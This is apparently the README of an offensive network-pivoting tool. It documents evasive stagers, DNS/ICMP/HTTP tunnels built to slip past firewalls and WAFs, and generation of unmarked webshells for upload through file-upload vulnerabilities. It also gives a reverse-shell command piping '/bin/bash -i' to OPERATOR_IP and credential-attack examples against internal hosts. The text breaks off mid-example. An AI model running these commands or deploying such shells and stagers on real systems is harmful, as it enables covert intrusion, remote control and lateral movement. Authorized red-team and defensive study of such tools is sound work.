# Burrow v4.0.0

Multi-transport network pivoting and tunneling tool for post-exploitation network traversal. Static Go binary.

## Overview

Burrow is a static Go binary built for post-exploitation network traversal. v3 introduces a pluggable transport architecture: any tunnel (SOCKS5, relay, pivot chain) runs over any transport (Raw TCP/TLS, WebSocket, DNS, ICMP). The agent/server model uses multiplexed yamux sessions over the control channel, letting a single connection carry multiple concurrent tunnels and control messages.

Non-root mode routes sessions through SOCKS5. Root mode uses a TUN interface backed by gvisor's userspace netstack for full IP-level routing without kernel module dependencies.

All traffic is encrypted: X25519 key exchange, HKDF-SHA256 key derivation, ChaCha20-Poly1305 or AES-256-GCM AEAD per frame. Agent connections use TLS with certificate fingerprint verification so agents can confirm they're talking to the right server without a CA chain.

A WebUI dashboard and interactive TUI are available for session management. The REST API is exclusively for MCP server integration. A Python companion package provides the MCP server module.

## Install / Build

Requires Go 1.24+.

```bash
# Build for current platform only (fast)
make build-local        # -> build/burrow

# Cross-compile all platforms (linux/windows/darwin, amd64+arm64)
make build              # -> build/burrow-<os>-<arch>[.exe]

# Build single platform
make build-linux-amd64
make build-linux-arm64
make build-windows-amd64

# Build all platforms + stager + evasion + packed variants
make build-all
```

### Stager

The stager (`cmd/stager/`) is a minimal agent for initial access — no TUI, no TUN, no SOCKS5. Built separately:

```bash
# Standard stager (linux-amd64 + windows-amd64)
make build-stager       # -> build/stager-linux-amd64, build/stager-windows-amd64.exe

# Obfuscated stager (requires anvil toolkit cloned next to burrow)
make build-stager-evasion

# Evasion + packed (smallest binary)
make build-stager-packed
```

Embed server address and fingerprint at compile time with `-ldflags`:

```bash
CGO_ENABLED=0 go build -ldflags="-s -w \
  -X main.defaultServer=10.0.0.1:11601 \
  -X main.defaultNoTLS=false \
  -X main.defaultFingerprint=AB:CD:EF:01:23:45:67:89 \
  -X main.defaultMasq=true" \
  -o build/stager ./cmd/stager/
```

Pre-compiled binaries are in `build/`:

| File | Platform |
|------|----------|
| `build/burrow-linux-amd64` | Linux x86_64 |
| `build/burrow-linux-arm64` | Linux ARM64 |
| `build/burrow-windows-amd64.exe` | Windows x86_64 |
| `build/burrow-darwin-amd64` | macOS Intel |
| `build/burrow-darwin-arm64` | macOS Apple Silicon |

## Transports

Select transport with `--transport <name>` on both server and agent. Both sides must use the same transport.

| Transport | Flag | Description | When to Use |
|-----------|------|-------------|-------------|
| Raw TCP/TLS | `raw` (default) | Direct TCP with TLS. Auto-generated Ed25519 self-signed certs. Fingerprint verification on agent side. | Default. Fast, reliable. Use when the network allows direct TCP. |
| WebSocket | `ws` | HTTP/HTTPS upgrade protocol. | Firewall evasion. Traffic looks like normal HTTPS. |
| DNS tunnel | `dns` | Encodes traffic in DNS queries/responses. | Restrictive networks where only DNS egress is allowed. |
| ICMP tunnel | `icmp` | Encodes traffic in ICMP echo payloads. | Networks where only ping is allowed. Requires raw socket privileges. |
| HTTP | `http` | HTTP polling. Traffic encoded as HTTP request/response pairs. Server provides a fake HTML cover page on GET /. | Restrictive networks where only HTTP/HTTPS egress is allowed. Works through web proxies and WAFs. |

## Commands Reference

### `burrow server`

Start the proxy server that accepts agent connections.

On startup, the server generates a self-signed Ed25519 TLS certificate and prints its SHA256 fingerprint. Pass this fingerprint to agents with `--fp` (or `-f`) so they can verify the server's identity. Short prefixes are supported — the first 8 bytes (as shown in the TUI) are sufficient.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `0.0.0.0:11601` | Listen address for agent connections |
| `--cert` | | Path to TLS certificate PEM file (overrides auto-generated cert) |
| `--key` | | Path to TLS private key PEM file |
| `--no-tls` | | Disable TLS (plaintext connections) |
| `--transport, -t` | `raw` | Transport protocol: `raw`, `ws`, `dns`, `icmp`, `http` |
| `--mcp-api` | | Enable REST API for MCP server integration |
| `--api-token` | | Token for API authentication (auto-generated if empty, only used with --mcp-api) |
| `--webui` | `0.0.0.0:9090` | Enable WebUI dashboard and optionally set listen address |
| `--tui` | | Launch interactive TUI dashboard (requires --mcp-api or --webui for session data) |
| `--log-file` | | Write server logs to the specified file (in addition to stdout/stderr) |

**Examples:**

```bash
# Raw TCP with auto-TLS (default)
burrow server

# Custom listen address
burrow server --listen 0.0.0.0:443

# WebSocket transport with WebUI
burrow server --transport ws --listen 0.0.0.0:443 --mcp-api

# DNS tunnel
burrow server --transport dns --listen 0.0.0.0:53

# ICMP tunnel
burrow server --transport icmp --listen 0.0.0.0:0

# Custom TLS certificate
burrow server --cert /path/to/cert.pem --key /path/to/key.pem

# WebUI on custom address
burrow server --mcp-api --webui 0.0.0.0:9090

# Interactive TUI dashboard
burrow server --tui --webui
```

**Expected output:**

```
[*] TLS fingerprint: SHA256:a3f2c1...
[*] Listening on 0.0.0.0:11601 (transport: raw)
[+] Agent connected: session-abc123 (hostname: target01, OS: linux, IPs: [10.0.0.5])
[-] Agent disconnected: session-abc123
```

---

### `burrow agent`

Connect back to a proxy server. The agent sends a handshake containing hostname, OS, IP addresses, PID, and version. The server assigns a session ID and the agent waits for commands: tunnel requests, route management, listener requests.

The agent auto-reconnects on disconnect. Use `--retry` to cap reconnection attempts.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--connect, -c` | (required) | Server address to connect to (`host:port`) |
| `--fp, -f` | | Expected server TLS fingerprint (SHA256). Full or prefix match. |
| `--retry` | `0` | Max reconnection attempts. `0` means infinite. |
| `--transport, -t` | `raw` | Transport protocol: `raw`, `ws`, `dns`, `icmp`, `http` |
| `--no-tls` | | Connect without TLS |

**Examples:**

```bash
# Basic connection
burrow agent --connect 10.0.0.1:11601

# With fingerprint verification (recommended)
burrow agent -c 10.0.0.1:11601 --fp AB:CD:EF:01:23:45:67:89

# WebSocket transport
burrow agent --connect 10.0.0.1:443 --transport ws

# DNS tunnel
burrow agent --connect 10.0.0.1:53 --transport dns

# ICMP tunnel
burrow agent --connect 10.0.0.1:0 --transport icmp

# Limit reconnection attempts
burrow agent -c 10.0.0.1:11601 --retry 5
```

**Expected output:**

```
[*] Connecting to 10.0.0.1:11601 (transport: raw)
[*] TLS fingerprint verified: SHA256:a3f2c1...
[+] Session established: session-abc123
[*] Waiting for commands...
```

On disconnect, the agent sleeps and retries. With `--retry 0`, it retries indefinitely.

---

### `burrow session list`

List all active agent sessions. Queries the REST API. The server must be running with `--mcp-api` or `--webui` enabled.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--webui` | `127.0.0.1:9090` | WebUI server address (persistent flag on `session` command) |
| `--token` | | API authentication token |
| `--no-tls` | | Use plain HTTP instead of HTTPS (default: use HTTPS) |
| `--json` | | Output session list as JSON (session list only) |

**Example:**

```bash
burrow session list --token <api-token>
burrow session list --token <api-token> --json
burrow session list --token <api-token> --webui 127.0.0.1:9090
burrow session list --token <api-token> --no-tls --webui 127.0.0.1:9090
```

**Expected output:**

```
ID               HOSTNAME    OS      IPs              CREATED
session-abc123   target01    linux   10.0.0.5         2024-01-15 14:32:01
session-def456   winbox      windows 192.168.1.20     2024-01-15 14:45:12
```

---

### `burrow session info <session-id>`

Show detailed information about a specific session, including active tunnels and routes.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--webui` | `127.0.0.1:9090` | WebUI server address (persistent flag on `session` command) |
| `--token` | | API authentication token |
| `--no-tls` | | Use plain HTTP instead of HTTPS (default: use HTTPS) |

**Example:**

```bash
burrow session info session-abc123 --token <api-token>
```

**Expected output:**

```
Session: session-abc123
  Hostname:  target01
  OS:        linux
  IPs:       10.0.0.5, 172.16.0.1
  Status:    connected
  Created:   2024-01-15 14:32:01

Tunnels:
  ID          DIRECTION  LISTEN              REMOTE           PROTOCOL  STATUS
  tun-001     local      127.0.0.1:8080      10.0.0.5:80      tcp       active
  tun-002     remote     0.0.0.0:9090        192.168.1.10:22  tcp       active

Routes:
  CIDR            STATUS
  10.0.0.0/24     active
  192.168.1.0/24  active
```

---

### `burrow session use <session-id>`

Enter an interactive REPL for managing a specific session. The prompt is `burrow> `.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--webui` | `127.0.0.1:9090` | WebUI server address (persistent flag on `session` command) |
| `--token` | | API authentication token |
| `--no-tls` | | Use plain HTTP instead of HTTPS (default: use HTTPS) |

**Example:**

```bash
burrow session use session-abc123 --token <api-token>
```

**Interactive commands:**

| Command | Description |
|---------|-------------|
| `info` | Show session details |
| `tunnels` | List active tunnels |
| `routes` | List active routes |
| `tunnel add <direction> <listen> <remote> [protocol]` | Create a tunnel. Direction: `local`, `remote`, or `reverse`. Protocol defaults to `tcp`. |
| `tunnel rm <tunnel-id>` | Remove a tunnel |
| `route add <cidr>` | Add a network route |
| `route rm <cidr>` | Remove a network route |
| `tun start` | Start TUN interface for transparent pivoting (root required) |
| `tun stop` | Stop TUN interface |
| `help` | Show available commands |
| `exit` | Exit the REPL |

**Example session:**

```
burrow session use session-abc123
Connected to session-abc123 (target01 / linux)

burrow> info
Session: session-abc123
  Hostname: target01
  ...

burrow> tunnel add local 127.0.0.1:8080 10.0.0.5:80
[+] Tunnel created: tun-001

burrow> tunnel add remote 0.0.0.0:9090 192.168.1.10:22
[+] Tunnel created: tun-002

burrow> route add 10.0.0.0/24
[+] Route added: 10.0.0.0/24

burrow> tunnels
ID          DIRECTION  LISTEN              REMOTE           PROTOCOL  STATUS
tun-001     local      127.0.0.1:8080      10.0.0.5:80      tcp       active
tun-002     remote     0.0.0.0:9090        192.168.1.10:22  tcp       active

burrow> tunnel rm tun-001
[+] Tunnel removed: tun-001

burrow> route rm 10.0.0.0/24
[+] Route removed: 10.0.0.0/24

burrow> exit
```

---

## TUN Transparent Pivoting (Root Required)

TUN mode creates a virtual network interface on the operator's machine, enabling transparent IP-level routing to the agent's network. Unlike SOCKS5 proxying, TUN mode works with ANY protocol (TCP, UDP, ICMP) and requires no proxy configuration on tools -- traffic routes transparently through the kernel's routing table.

TUN mode uses gvisor's userspace TCP/IP stack on the agent side, so the agent does NOT need root privileges. Only the operator (server) needs root to create the TUN interface.

### How It Works

1. The operator starts TUN on a session -- this creates a `tun0` interface with a magic IP (`240.0.0.1`)
2. The operator adds routes for target subnets (e.g., `10.10.10.0/24`) pointing through the TUN interface
3. IP packets matching those routes flow through TUN -> yamux stream -> agent's netstack -> real target
4. Responses flow back the same path transparently

### Why Routes Are Manual

Routes must be added manually because the server cannot reliably determine which subnets are C2 infrastructure vs. target networks. Adding the wrong route (e.g., the C2 subnet) would create a routing loop that kills the agent connection. This is the same approach used by ligolo-ng and other professional pivoting tools.

### TUN Workflow -- TUI

```bash
# Start server with TUI as root
sudo burrow server --tui --webui
```

1. In the session list, press `t` to toggle TUN ON for the selected agent
2. Press `Enter` to enter the session detail view
3. Press `r` to open the Add Route form
4. Enter the target subnet CIDR (e.g., `10.10.10.0/24`) and press `Enter`
5. Traffic to that subnet now flows transparently through the agent

### TUN Workflow -- CLI

```bash
# Start server as root
sudo burrow server

# In another terminal, enter the session
burrow session use <session-id>

# Start TUN interface
burrow> tun start
[+] TUN started

# Add route for target network
burrow> route add 10.10.10.0/24
[+] Route added: 10.10.10.0/24

# Now use ANY tool -- traffic routes transparently
# No proxy configuration needed!
nmap -sT -Pn 10.10.10.0/24
nxc smb 10.10.10.25 -u admin -p 'Password1!'
curl http://10.10.10.15/
ssh user@10.10.10.25

# When done
burrow> tun stop
[+] TUN stopped
```

### TUN Workflow -- Real-World Example

Scenario: You have SSH access to a dual-homed victim (10.10.155.5 on eth0, 10.10.10.5 on eth1). You want to reach the internal 10.10.10.0/24 network.

```bash
# 1. Start Burrow server (operator, as root)
sudo burrow server --tui --webui

# 2. SSH reverse tunnel to forward agent traffic
ssh -R 11601:127.0.0.1:11601 user@10.10.155.5

# 3. Run agent on victim (through the SSH tunnel)
./burrow agent --connect 127.0.0.1:11601

# 4. In TUI: press 't' to enable TUN on the new session
# 5. Press Enter, then 'r', add route: 10.10.10.0/24

# 6. Tools now work directly against the internal network:
nxc smb 10.10.10.25 -u ferrucio -p 'Winter2023!' --users
crackmapexec rdp 10.10.10.0/24
```

### Common Mistakes

| Mistake | Result | Fix |
|---------|--------|-----|
| Routing the C2 subnet through TUN | Agent connection dies (routing loop) | Only route TARGET subnets, never the C2 path |
| Forgetting `sudo` | TUN creation fails (permission denied) | Run `burrow server` as root |
| Adding overlapping routes | Traffic may not flow as expected | Use specific CIDRs, avoid /8 or /0 |
| Agent dies, routes remain | Traffic blackholed | Remove stale routes with `route rm` or `ip route del` |


### `burrow proxy socks5`

Start a SOCKS5 proxy server (RFC 1928). Supports the CONNECT method. Useful for routing arbitrary TCP traffic through an agent session without setting up explicit port forwards.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `127.0.0.1:1080` | Listen address |
| `--auth` | | Authentication credentials as `user:pass` |

**Examples:**

```bash
# Basic SOCKS5 proxy
burrow proxy socks5

# Custom listen address
burrow proxy socks5 --listen 0.0.0.0:9050

# With authentication
burrow proxy socks5 --listen 127.0.0.1:1080 --auth operator:s3cr3t
```

**Expected output:**

```
[*] SOCKS5 proxy listening on 127.0.0.1:1080
[+] Connection: 127.0.0.1:54321 -> 10.0.0.5:80 (142 bytes transferred)
[*] Shutting down. Total connections: 3, bytes transferred: 48291
```

Configure tools to use the proxy:

```bash
curl --socks5 127.0.0.1:1080 http://10.0.0.5/
proxychains nmap -sT 10.0.0.0/24
```

---

### `burrow proxy http`

Forward HTTP proxy server with CONNECT support. Handles both HTTP CONNECT tunneling (for HTTPS) and regular HTTP request forwarding. Supports optional Basic auth.

The proxy includes a Dialer hook for session routing. When used with an agent session, traffic routes through the yamux session to internal networks rather than the local network stack.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `127.0.0.1:8080` | Listen address (host:port) |
| `--auth` | | Authentication credentials as `user:pass` |

**Examples:**

```bash
# Basic HTTP proxy
burrow proxy http

# Custom listen address
burrow proxy http --listen 127.0.0.1:3128

# With Basic auth
burrow proxy http --listen 127.0.0.1:8080 --auth operator:s3cr3t
```

**Expected output:**

```
[*] HTTP proxy listening on 127.0.0.1:8080
[+] CONNECT 10.0.0.5:443 from 127.0.0.1:54321 (512 bytes transferred)
[+] GET http://internal.host/api from 127.0.0.1:54322 -> 200 OK (1024 bytes)
[*] Shutting down. Total connections: 5, bytes transferred: 92140
```

Configure tools to use the proxy:

```bash
# curl with HTTP proxy
curl -x http://127.0.0.1:8080 http://internal.host/

# Environment variable for tools that respect HTTP_PROXY
HTTP_PROXY=http://127.0.0.1:8080 wget http://internal/

# With auth
curl -x http://operator:s3cr3t@127.0.0.1:8080 http://internal.host/
```

---

### `burrow tunnel server`

HTTP tunnel server. Runs on the target machine. Accepts inbound HTTP POST requests from the attacker and relays TCP connections to internal hosts. Serves a fake "It works!" HTML cover page on GET / to blend in with normal web traffic.

This solves the egress-blocked scenario: the target has no outbound connectivity, but the attacker can reach the target's HTTP port. The server listens for HTTP requests and acts as a relay, so all pivoting traffic flows inbound from the attacker's perspective.

**Modes:**

- **Basic** (default): reGeorg-style XOR encoding, query-param commands, `X-Token` auth header.
- **Secure** (`-s`): AES-256-GCM encryption (HKDF-SHA256 key derivation), commands in cookies, HTML-wrapped responses that look like a modern SPA. Always returns 200 OK — no signaturable query strings or error status codes. Designed to evade WAFs and DPI.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `0.0.0.0:8080` | Listen address (host:port) |
| `--key, -k` | | Shared encryption/authentication key |
| `--path` | `/b` | URL path for the tunnel endpoint |
| `--secure, -s` | `false` | Enable secure mode (AES-256-GCM, cookie commands, HTML wrapping) |

**Examples:**

```bash
# Basic HTTP tunnel server (no encryption)
burrow tunnel server -l 0.0.0.0:8080

# With encryption and authentication
burrow tunnel server -l 0.0.0.0:8080 -k s3cret

# Secure mode — AES-256-GCM, WAF evasion
burrow tunnel server -l 0.0.0.0:443 -k s3cret -s

# Custom path (blend in with existing app routes)
burrow tunnel server -l 0.0.0.0:8080 -k s3cret --path /api/health -s
```

**Expected output:**

```
[*] Starting tunnel server on 0.0.0.0:8080 [secure (AES-256-GCM)]
```

**Protocol details:**

Basic mode uses a simple HTTP-based protocol with 5 commands: `connect`, `send`, `recv`, `disconnect`, and `ping`. Each request carries a session ID in query params. When `--key` is set, payloads are XOR-encrypted and base64-encoded, and each request must include a valid SHA256 HMAC `X-Token` header.

Secure mode (`-s`) encrypts commands inside cookies (cookie name derived from PSK), encrypts payloads with AES-256-GCM, and wraps all responses in HTML with encrypted data in a `data-cfg` attribute. No query params, no special headers, no non-200 status codes — traffic looks like normal web browsing.

---

### `burrow tunnel client`

HTTP tunnel client providing a local SOCKS5 proxy interface. Runs on the attacker machine. All SOCKS5 traffic is tunneled through HTTP POST requests to the server. Point your tools at the local SOCKS5 port and traffic flows through the HTTP tunnel to the target network.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--connect, -c` | (required) | Tunnel server URL (e.g. `http://target:8080/b`) |
| `--listen, -l` | `127.0.0.1:1080` | Local SOCKS5 listen address |
| `--key, -k` | | Shared encryption/authentication key (must match server) |
| `--secure, -s` | `false` | Enable secure mode (must match server) |

**Examples:**

```bash
# Connect to a running tunnel server (basic mode)
burrow tunnel client -c http://target:8080/b

# With encryption (key must match server)
burrow tunnel client -c http://target:8080/b -k s3cret

# Secure mode (must match server's -s flag)
burrow tunnel client -c https://target:443/app -k s3cret -s

# Custom local SOCKS5 port
burrow tunnel client -c http://target:8080/b -k s3cret -l 127.0.0.1:9050
```

**Expected output:**

```
[*] Starting tunnel client [secure (AES-256-GCM)]
[*] SOCKS5 proxy: 127.0.0.1:1080
[*] Tunnel server: https://target:443/app
```

**Full workflow (both sides):**

```bash
# On target (no outbound connectivity needed):
burrow tunnel server -l 0.0.0.0:8080 -k s3cret

# On attacker:
burrow tunnel client -c http://target:8080/b -k s3cret -l 127.0.0.1:1080

# Now route tools through the SOCKS5 proxy:
proxychains ssh user@10.0.0.20
proxychains curl http://10.0.0.30/admin
```

---

### `burrow generate webshell`

Generate tunnel webshells (PHP, ASPX, or JSP) that implement the same protocol as `burrow tunnel server`. Deploy the generated file to the target's web root, then connect with `burrow tunnel client`. Useful when you can upload files to a web server but can't deploy a binary. Use `--secure` to generate AES-256-GCM webshells for the secure tunnel mode.

Generated webshells contain no identifying comments and no hardcoded strings that would fingerprint them as Burrow-related. The key is embedded at generation time.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--format, -f` | (required) | Webshell format: `php`, `aspx`, or `jsp` |
| `--key, -k` | (required) | Shared encryption/authentication key (embedded in the webshell) |
| `--output, -o` | stdout | Output file path |
| `--secure, -s` | `false` | Generate secure mode webshell (AES-256-GCM) |

**Examples:**

```bash
# Generate a PHP webshell
burrow generate webshell --format php --key s3cret -o tunnel.php

# Generate an ASPX webshell
burrow generate webshell --format aspx --key s3cret -o tunnel.aspx

# Generate a JSP webshell
burrow generate webshell --format jsp --key s3cret -o tunnel.jsp

# Print to stdout (pipe or inspect)
burrow generate webshell --format php --key s3cret
```

**Workflow: generate, upload, connect:**

```bash
# Step 1: Generate the webshell on the attacker machine
burrow generate webshell --format php --key s3cret -o tunnel.php

# Step 2: Upload tunnel.php to the target web root
# (via file upload vulnerability, FTP, SCP, CMS plugin, etc.)

# Step 3: Connect with tunnel client
burrow tunnel client -c http://target/tunnel.php -k s3cret -l 127.0.0.1:1080

# Step 4: Route tools through the SOCKS5 proxy
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://10.10.10.5/internal-api
```

**Security notes:**

Webshells are generated without any identifying comments, author strings, or tool-specific markers. The key is embedded as a derived constant so the raw key string does not appear in the file. Each generated file is functionally identical to a hand-written implementation of the protocol.

---

### `burrow tunnel local`

Local port forward. Listens on a local address and forwards TCP connections to a remote target. Equivalent to `ssh -L`.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `127.0.0.1:8080` | Local listen address |
| `--remote, -r` | (required) | Remote target address (`host:port`) |

**Examples:**

```bash
# Forward local 8080 to internal web server
burrow tunnel local --listen 127.0.0.1:8080 --remote 10.0.0.5:80

# Forward local 5432 to internal Postgres
burrow tunnel local --listen 127.0.0.1:5432 --remote db.internal:5432

# Listen on all interfaces
burrow tunnel local --listen 0.0.0.0:8080 --remote 10.0.0.5:80
```

**Expected output:**

```
[*] Local forward: 127.0.0.1:8080 -> 10.0.0.5:80
[+] Connection from 127.0.0.1:54321: 8192 bytes transferred
[*] Shutting down.
```

---

### `burrow tunnel remote`

Remote port forward. Listens on the given address and forwards connections to a target. Equivalent to `ssh -R`.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `0.0.0.0:9090` | Listen address |
| `--remote, -r` | (required) | Target address (`host:port`) |

**Examples:**

```bash
# Expose internal SSH on port 9090
burrow tunnel remote --listen 0.0.0.0:9090 --remote 192.168.1.10:22

# Custom listen address
burrow tunnel remote --listen 127.0.0.1:3306 --remote db.internal:3306
```

**Expected output:**

```
[*] Remote forward: 0.0.0.0:9090 -> 192.168.1.10:22
[+] Connection from 10.0.0.1:41234: 4096 bytes transferred
```

---

### `burrow tunnel reverse`

Reverse tunnel with automatic reconnection. The agent side connects out to a controller address, and the controller forwards connections to a local target. Useful when the target can't accept inbound connections.

Uses exponential backoff for reconnection and sends keepalive heartbeats to detect dead connections.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--agent-addr` | `0.0.0.0:8443` | Agent/controller address to connect to |
| `--local-target` | `127.0.0.1:22` | Local target to forward connections to |
| `--max-retries` | `10` | Max reconnection attempts before giving up |

**Examples:**

```bash
# Reverse tunnel for SSH access
burrow tunnel reverse --agent-addr attacker.com:8443 --local-target 127.0.0.1:22

# Reverse tunnel for RDP
burrow tunnel reverse --agent-addr 10.0.0.1:8443 --local-target 127.0.0.1:3389 --max-retries 20
```

**Expected output:**

```
[*] Reverse tunnel: connecting to attacker.com:8443
[*] Forwarding to 127.0.0.1:22
[+] Connected. Waiting for connections...
[-] Connection lost. Retrying in 2s (attempt 1/10)
[+] Reconnected.
```

---

### `burrow pivot`

Multi-hop pivot chain. Connects through a sequence of intermediate hosts to reach a final target. Each hop is a `host:port` pair. Use `--local-port` to open a local listener that routes through the full chain.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--target, -t` | (required) | Final target host |
| `--port, -p` | `8443` | Final target port |
| `--hop` | | Intermediate hop (`host:port`). Repeatable for multi-hop chains. |
| `--local-port` | `0` | Open a local listener on this port. `0` disables the listener. |

**Examples:**

```bash
# Single hop
burrow pivot --target final.host --port 443 --hop hop1:22

# Multi-hop chain
burrow pivot --target final.host --port 443 --hop hop1:22 --hop hop2:443

# With local listener for proxying
burrow pivot --target final.host --port 443 --hop hop1:22 --hop hop2:443 --local-port 1080
```

**Expected output:**

```
[*] Pivot chain:
    local -> hop1:22 -> hop2:443 -> final.host:443
[*] Latency: hop1=12ms, hop2=34ms, final=67ms
[*] Local listener: 127.0.0.1:1080
[+] Ready.
```

---

### `burrow scan`

Network enumeration with service detection. Scans a subnet for reachable hosts, open ports, and running services with version detection.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--subnet, -s` | (required) | Subnet to scan (CIDR notation) |
| `--ports, -p` | top 20 common ports | Comma-separated list of ports to scan |
| `--timeout` | `2s` | Per-port connection timeout |
| `--concurrency` | `256` | Max concurrent connections |
| `-v` | (off) | Banner grabbing for version detection |
| `-vv` | (off) | Detailed probes (SMB, RDP negotiation) |
| `-vvv` | (off) | Full raw banner output |

**Verbosity levels:**

| Level | Command | Speed | Detection |
|-------|---------|-------|-----------|
| Quick (default) | `burrow scan -s 10.0.0.0/24` | Fast | Port + service name only |
| Standard | `burrow scan -s 10.0.0.0/24 -v` | Medium | + SSH/HTTP/FTP version from banners |
| Detailed | `burrow scan -s 10.0.0.0/24 -vv` | Slower | + SMB1/SMB2, RDP, protocol negotiation |
| Intensive | `burrow scan -s 10.0.0.0/24 -vvv` | Slowest | Full raw banners for manual analysis |

**Examples:**

```bash
# Quick scan - find live hosts fast
burrow scan -s 10.0.0.0/24

# Standard scan with service versions
burrow scan -s 10.0.0.0/24 -v

# Target specific ports with banners
burrow scan -s 10.0.0.0/24 -p 22,445,3389,5985 -v

# Full enumeration for critical targets
burrow scan -s 10.10.10.0/24 -p 22,80,445,3389,5985,8080 -vv
```

**Expected output (with -v):**

```
[*] Scanning 10.0.0.0/24 [standard mode]

[*] Found 3 host(s) in 2.1s:

  10.0.0.5       Services: [PIVOT]
      22/tcp    open  SSH (OpenSSH 8.9)
      80/tcp    open  HTTP (nginx)
      445/tcp   open  SMB (SMB2/3)

  10.0.0.25     Services:
      22/tcp    open  SSH
      3389/tcp  open  RDP
      5985/tcp  open  WinRM

  10.0.0.50     Services: [PIVOT]
      80/tcp    open  HTTP (Apache)
```

---

### `burrow topology`

Display the current pivot infrastructure from a running Burrow server. Shows all connected agents, active tunnels, routes, and discovered hosts from scan results.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--api-url` | `127.0.0.1:9091` | Burrow server URL |
| `--api-token` | | API authentication token |
| `--no-tls` | | Use plain HTTP instead of HTTPS |

**Examples:**

```bash
# Query local server
burrow topology

# Query remote server
burrow topology --api-url 10.0.0.1:9091 --api-token YOUR_TOKEN
```

**Expected output:**

```
[Infrastructure]
└── Burrow Server
    ├── Agent victim01 [DC-HOST]
    │   IPs: 10.10.155.5 | OS: linux | RTT: 1200us
    │   ├── tunnel ● local 127.0.0.1:8080 → 10.10.10.5:445
    │   ├── route 10.10.10.0/24
    │   └── subnet [10.10.10.0/24] (3 hosts)
    │       ├── host 10.10.10.5 [smb,http]
    │       ├── host 10.10.10.25 [ssh,rdp]
    │       └── host 10.10.10.50 [http,winrm]
    └── Agent workstation02
        IPs: 192.168.1.100 | OS: windows | RTT: 800us
        └── tunnel ● local 127.0.0.1:3389 → 192.168.1.50:3389
```

---

### `burrow relay`

Socat-style bidirectional relay. Takes two endpoint specs and relays data between them. Useful for bridging protocols, exposing Unix sockets over TCP, or piping commands.

**Usage:**

```bash
burrow relay [--tls] <source-spec> <dest-spec>
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--tls` | Wrap connections in TLS |

**Endpoint spec types:**

| Spec | Description |
|------|-------------|
| `tcp-listen:<port>` | Listen on all interfaces, given port |
| `tcp-listen:<host>:<port>` | Listen on specific address |
| `tcp-connect:<host>:<port>` | Connect to host:port |
| `udp-listen:<port>` | UDP listener |
| `udp-listen:<host>:<port>` | UDP listener on specific address |
| `udp-connect:<host>:<port>` | UDP connect |
| `unix-listen:<path>` | Listen on Unix domain socket |
| `unix-connect:<path>` | Connect to Unix domain socket |
| `exec:<command>` | Execute command, relay stdio |
| `stdio` | Standard input/output |

**Examples:**

```bash
# TCP relay: expose internal service on external port
burrow relay tcp-listen:8080 tcp-connect:10.0.0.5:80

# Unix socket to TCP
burrow relay unix-listen:/tmp/relay.sock tcp-connect:10.0.0.5:22

# Pipe command output over TCP
burrow relay stdio tcp-connect:10.0.0.1:4444

# TLS-wrapped relay
burrow relay --tls tcp-listen:443 tcp-connect:127.0.0.1:8080

# UDP relay
burrow relay udp-listen:5353 udp-connect:8.8.8.8:53
```

**Expected output:**

```
[*] Relay: tcp-listen:8080 <-> tcp-connect:10.0.0.5:80
[+] Connection from 127.0.0.1:54321: relaying...
[*] Bytes: 4096 -> 8192
```

---

### Complete Relay Workflow

#### TCP relay bridging two networks

```bash
# Expose an internal service (10.0.0.5:80) on the operator's port 8080
burrow relay tcp-listen:8080 tcp-connect:10.0.0.5:80

# Now connect from anywhere:
curl http://127.0.0.1:8080/
```

#### Unix socket exposure over TCP

```bash
# Expose a local Unix socket (e.g. Docker daemon) over TCP
burrow relay tcp-listen:2375 unix-connect:/var/run/docker.sock

# Use it remotely:
docker -H tcp://127.0.0.1:2375 ps
```

#### Exec relay for reverse shells

```bash
# Operator: listen for incoming shell
burrow relay tcp-listen:4444 stdio

# Target: send shell back
burrow relay stdio tcp-connect:OPERATOR_IP:4444
# Then pipe a shell: /bin/bash -i | burrow relay stdio tcp-connect:OPERATOR_IP:4444
```

#### Chaining relay with tunnel

```bash
# Step 1: forward agent session tunnel to local port
# (inside burrow session use)
burrow> tunnel add local 127.0.0.1:9000 10.0.0.5:8080

# Step 2: relay that local port to another internal host
burrow relay tcp-listen:9001 tcp-connect:127.0.0.1:9000
```

## Typical Workflows

### Agent-Based Tunneling

```bash
# Operator: start server with TUI (as root for TUN support)
sudo burrow server --tui --webui

# Target: run agent
burrow agent --connect OPERATOR_IP:11601 --fp AB:CD:EF:01:23:45:67:89

# In TUI: manage sessions, tunnels, routes, and TUN
# Or use CLI:
burrow session use SESSION_ID
burrow> tunnel add local 127.0.0.1:8080 10.0.0.5:80
burrow> tun start
burrow> route add 10.0.0.0/24
burrow> exit
```

### Remote Tunnel — Serve Files / Forward Ports Back to Operator

Remote tunnels make the agent listen on the pivot machine and forward connections back through yamux to the operator's machine. This is essential for serving files to internal hosts that can't reach the operator directly.

**How it works:** The agent opens a listener on the pivot. When an internal host connects, the agent opens a yamux stream back to the server, which dials the target address on the **operator's** machine. Traffic relays bidirectionally through the stream.

**Real-world example:** Serve tools to internal machines through a dual-homed pivot.

```bash
# 1. Operator: start HTTP server with your tools
python3 -m http.server 6969

# 2. Operator: start Burrow server (as root for TUN support)
sudo burrow server --tui --webui

# 3. SSH reverse tunnel for C2 egress (pivot can't reach operator directly)
ssh -R 11601:127.0.0.1:11601 user@10.10.155.5

# 4. Pivot: start agent (connects through SSH tunnel)
./burrow agent --connect 127.0.0.1:11601

# 5. Operator TUI: add remote tunnel
#    This makes the pivot listen on 0.0.0.0:6969 and forward
